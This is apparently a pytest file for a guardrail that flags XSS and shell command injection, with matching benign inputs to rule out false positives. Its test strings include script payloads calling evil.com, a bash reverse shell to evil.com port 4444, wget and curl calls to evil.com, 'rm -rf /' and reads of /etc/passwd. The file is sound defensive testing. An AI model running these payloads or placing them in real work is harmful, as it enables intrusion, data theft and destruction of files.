"""
Tests for XSS and shell command injection detection in guardrails.
Addresses SEC-26: guardrails did not detect XSS or shell commands.

Tests both detection (must flag) and benign inputs (must not false-positive).
"""

import pytest
from tests.conftest import tool_fn, parse_tool_result


def _check(all_tools, text: str) -> dict:
    fn = tool_fn(all_tools, "thinkneo_check")
    return parse_tool_result(fn(text=text))


# ====================================================================
# XSS Detection — must flag
# ====================================================================

class TestXSSDetection:
    def test_xss_script_tag(self, all_tools):
        r = _check(all_tools, '<script>alert(1)</script>')
        assert r["safe"] is False

    def test_xss_script_with_src(self, all_tools):
        r = _check(all_tools, '<script src="https://evil.com/xss.js"></script>')
        assert r["safe"] is False

    def test_xss_event_handler_onerror(self, all_tools):
        r = _check(all_tools, '<img onerror="alert(1)" src=x>')
        assert r["safe"] is False

    def test_xss_event_handler_onload(self, all_tools):
        r = _check(all_tools, '<body onload="fetch(\'https://evil.com\')">hi</body>')
        assert r["safe"] is False

    def test_xss_event_handler_onclick(self, all_tools):
        r = _check(all_tools, '<a onclick="stealCookies()">click me</a>')
        assert r["safe"] is False


# ====================================================================
# Shell Command Injection — must flag
# ====================================================================

class TestShellDetection:
    def test_shell_dollar_paren(self, all_tools):
        r = _check(all_tools, '$(whoami)')
        assert r["safe"] is False

    def test_shell_backtick_cat(self, all_tools):
        r = _check(all_tools, '`cat /etc/passwd`')
        assert r["safe"] is False

    def test_shell_semicolon_cat(self, all_tools):
        r = _check(all_tools, '; cat /etc/passwd')
        assert r["safe"] is False

    def test_shell_pipe_whoami(self, all_tools):
        r = _check(all_tools, '| whoami')
        assert r["safe"] is False

    def test_shell_semicolon_rm(self, all_tools):
        r = _check(all_tools, '; rm -rf /')
        assert r["safe"] is False

    def test_shell_semicolon_wget(self, all_tools):
        r = _check(all_tools, '; wget http://evil.com/shell.sh')
        assert r["safe"] is False

    def test_shell_pipe_curl(self, all_tools):
        r = _check(all_tools, '| curl http://evil.com/steal')
        assert r["safe"] is False

    def test_shell_semicolon_bash(self, all_tools):
        r = _check(all_tools, '; bash -i >& /dev/tcp/evil.com/4444 0>&1')
        assert r["safe"] is False

    def test_shell_semicolon_python(self, all_tools):
        r = _check(all_tools, '; python -c "import os; os.system(\'id\')"')
        assert r["safe"] is False


# ====================================================================
# Benign Inputs — must NOT false-positive
# ====================================================================

class TestNoFalsePositives:
    def test_benign_html_paragraph(self, all_tools):
        r = _check(all_tools, '<p>This is a paragraph</p>')
        assert r["safe"] is True

    def test_benign_mention_of_script(self, all_tools):
        r = _check(all_tools, 'The script tag is used in HTML for JavaScript.')
        assert r["safe"] is True

    def test_benign_price(self, all_tools):
        r = _check(all_tools, 'The price is $50 per month')
        assert r["safe"] is True

    def test_benign_css_style(self, all_tools):
        r = _check(all_tools, '<style>body { color: red; }</style>')
        assert r["safe"] is True

    def test_benign_pipe_in_text(self, all_tools):
        r = _check(all_tools, 'Use the pipe | character to separate values')
        assert r["safe"] is True

    def test_benign_semicolon_in_text(self, all_tools):
        r = _check(all_tools, 'First do this; then do that; finally complete.')
        assert r["safe"] is True

    def test_benign_programming_discussion(self, all_tools):
        r = _check(all_tools, 'In Python, use os.system() to run shell commands.')
        assert r["safe"] is True

    def test_markdown_inline_code_flags_shell(self, all_tools):
        """Backtick-wrapped shell commands are flagged — expected behavior.
        The guardrail is advisory and cannot distinguish markdown code
        examples from actual shell injection at the regex level."""
        r = _check(all_tools, 'Run `ls -la` to list files')
        assert r["safe"] is False  # Expected: backtick+shell = flagged
